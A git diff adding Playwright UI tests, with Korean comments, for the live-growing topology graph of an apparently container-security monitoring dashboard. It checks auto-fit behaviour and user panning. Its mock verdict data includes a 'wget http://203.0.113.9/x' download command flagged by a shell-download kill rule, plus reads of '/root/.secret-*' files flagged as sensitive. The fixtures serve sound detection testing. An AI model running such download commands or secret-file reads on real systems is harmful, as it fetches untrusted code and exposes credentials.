@@ -246,3 +246,101 @@ test.describe('토폴로지 — 정상 컨테이너 접기 + 최소 배율 (11/0
     }
   });
 });
+
+// 11/09 2차(메인 실측 5173): 실제 가젯은 이벤트가 WebSocket 으로 계속 들어와 처음 몇 초 사이 그래프가 자란다.
+// 처음 맞춤(정상 컨테이너 두 줄을 가운데 · 1.1배) 뒤 위험 컨테이너가 위에 끼어들어도 다시 맞추지 않아 위 절반이 비고 위험 컨테이너가 칸 아래로 나갔다.
+// 사용자가 화면을 움직이기 전까지는 모양이 바뀌면 같은 규칙으로 다시 맞추고, 움직인 뒤에는 그대로 둔다(「화면 맞춤」 버튼은 다시 따라가기)
+test.describe('토폴로지 — 실시간으로 자라는 그래프의 화면 맞춤 (11/09 2차)', () => {
+  const RISKY = 'sg-topo-sample';
+  const verdict = (name: string, e: Partial<Event> & Pick<Event, 'kind' | 'comm'>, hit?: { ruleId: string; action: 'alert' | 'kill' }): Verdict => {
+    const event = ev(name, 'demo/sample:1', Date.now(), e);
+    return hit ? { event, matched: true, ruleId: hit.ruleId, action: hit.action, reason: hit.ruleId, ...(hit.action === 'kill' && { dryRun: true, enforced: false }) } : { event, matched: false };
+  };
+  const send = (b: MockBackend, vs: Verdict[]) => vs.forEach((v) => b.send({ type: 'verdict', data: v }));
+  const normal = (name: string, n: number, from = 0) =>
+    Array.from({ length: n }, (_, i) => verdict(name, { kind: 'open', comm: 'postgres', path: `/proc/${from + i}/stat` }));
+  // 위험 컨테이너: wget 실행(격리 대상) + 비밀 파일 열기 경고 16개(위험 말단은 상한 없이 전부) → 칸을 넘치는 높이
+  const risky = (from: number, n: number) => [
+    verdict(RISKY, { kind: 'exec', comm: 'wget', args: 'wget http://203.0.113.9/x' }, { ruleId: 'no-shell-download', action: 'kill' }),
+    ...Array.from({ length: n }, (_, i) =>
+      verdict(RISKY, { kind: 'open', comm: i % 2 ? 'cat' : 'sh', path: `/root/.secret-${from + i}` }, { ruleId: 'sensitive-files', action: 'alert' }),
+    ),
+  ];
+  // 맞춤이 끝나 300ms 동안 같은 시점일 때까지 기다린다
+  async function settled(page: Page): Promise<string> {
+    const read = () => page.locator('.react-flow__viewport').evaluate((el) => getComputedStyle(el).transform);
+    let prev = '';
+    for (let i = 0; i < 40; i++) {
+      const t = await read();
+      if (t === prev) return t;
+      prev = t;
+      await page.waitForTimeout(300);
+    }
+    return prev;
+  }
+  // 그려진 노드 전체의 칸 안 위 · 아래 여백
+  const margins = (page: Page) =>
+    page.evaluate(() => {
+      const pane = document.querySelector('[data-testid="topology"] .react-flow')!.getBoundingClientRect();
+      const boxes = [...document.querySelectorAll('.react-flow__node')].map((e) => e.getBoundingClientRect());
+      return { top: Math.min(...boxes.map((b) => b.top)) - pane.top, bottom: pane.bottom - Math.max(...boxes.map((b) => b.bottom)) };
+    });
+  // 실시간 시작: 런타임 이벤트 없이 열고, 정상 컨테이너 두 개 → 맞춤 → 위험 컨테이너가 나눠 들어옴
+  async function stream(page: Page, b: MockBackend) {
+    b.recent = b.recent.filter((v) => v.event.containerName.startsWith('sg-install-'));
+    await page.goto('/topology');
+    await expect(page.getByText('실시간 연결됨')).toBeVisible();
+    send(b, [...normal('db-a', 3), ...normal('db-b', 3, 10)]);
+    await expect(folded(page)).toHaveCount(2);
+    await settled(page);
+    for (let k = 0; k < 4; k++) {
+      send(b, [...risky(k * 4, 4), ...normal('db-a', 2, 100 + k * 2)]);
+      await page.waitForTimeout(400);
+    }
+    await expect(page.locator('.react-flow__node[data-id^="f:sg-topo-sample:"]')).toHaveCount(16);
+  }
+
+  test('⑨ 처음 맞춤 뒤 위험 컨테이너가 들어오면 다시 맞춤 — 위험 컨테이너가 칸 안 · 위쪽 빈 여백 없음', async ({ page, backend }) => {
+    await stream(page, backend);
+    await settled(page);
+    const s = await page.locator('.react-flow__viewport').evaluate((el) => new DOMMatrixReadOnly(getComputedStyle(el).transform).a);
+    expect(s, `배율 ${s}`).toBeGreaterThanOrEqual(READABLE);
+    expect(await inPane(page, `c:${RISKY}`), '위험 컨테이너 노드가 칸 안').toBe(true);
+    const m = await margins(page);
+    // 칸을 넘치는 높이 — 위 · 왼쪽부터 맞춤(위 여백 = 맞춤 여백 24 안팎)
+    expect(m.top, `위 여백 ${JSON.stringify(m)}`).toBeGreaterThanOrEqual(0);
+    expect(m.top, `위 여백 ${JSON.stringify(m)}`).toBeLessThanOrEqual(40);
+    await page.screenshot({ path: `${SHOT_DIR}/stream-refit.png` });
+  });
+
+  test('⑩ 사용자가 끌어 옮긴 뒤에는 자라도 다시 맞추지 않음 · 「화면 맞춤」은 다시 맞춤', async ({ page, backend }) => {
+    await stream(page, backend);
+    await settled(page);
+    expect(await inPane(page, `c:${RISKY}`), '자동 맞춤으로 위험 컨테이너가 칸 안').toBe(true);
+    // 노드가 없는 빈 바닥을 찾아 위로 120px 끈다
+    const p = await page.evaluate(() => {
+      const r = document.querySelector('[data-testid="topology"] .react-flow')!.getBoundingClientRect();
+      for (let y = r.bottom - 40; y > r.top + 40; y -= 20)
+        for (let x = r.left + 80; x < r.right - 40; x += 20) if (document.elementFromPoint(x, y)?.classList.contains('react-flow__pane')) return { x, y };
+      return null;
+    });
+    expect(p, '빈 바닥').not.toBeNull();
+    await page.mouse.move(p!.x, p!.y);
+    await page.mouse.down();
+    await page.mouse.move(p!.x, p!.y - 120, { steps: 6 });
+    await page.mouse.up();
+    const moved = await settled(page);
+    // 더 자란다: 새 정상 컨테이너 2개 + 위험 말단 4개
+    send(backend, [...normal('db-c', 3, 300), ...normal('db-d', 3, 400), ...risky(16, 4)]);
+    await expect(folded(page)).toHaveCount(4);
+    await expect(page.locator('.react-flow__node[data-id^="f:sg-topo-sample:"]')).toHaveCount(20);
+    await page.waitForTimeout(1200);
+    expect(await settled(page), '옮긴 시점 그대로').toBe(moved);
+    // 「화면 맞춤」 → 위 · 왼쪽부터 다시
+    await page.locator('.react-flow__controls-fitview').click();
+    const fitted = await settled(page);
+    expect(fitted).not.toBe(moved);
+    expect(await inPane(page, `c:${RISKY}`)).toBe(true);
+    expect((await margins(page)).top).toBeLessThanOrEqual(40);
+  });
+});
